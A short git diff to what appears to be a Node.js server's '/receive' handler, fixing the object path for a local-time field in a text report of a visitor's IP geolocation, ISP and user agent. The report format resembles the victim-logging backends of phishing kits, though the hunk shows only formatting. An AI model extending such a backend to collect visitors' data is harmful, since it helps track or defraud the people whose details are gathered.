@@ -231,7 +231,7 @@ app.post('/receive', async (req, res) => {
       `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
       `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
       `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-      `TIME               : ${ipAddressInformation.timeZone.localTime}\n` +
+      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
       `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
       `💻 SYSTEM INFO\n` +
       `USER AGENT       : ${userAgent}\n` +
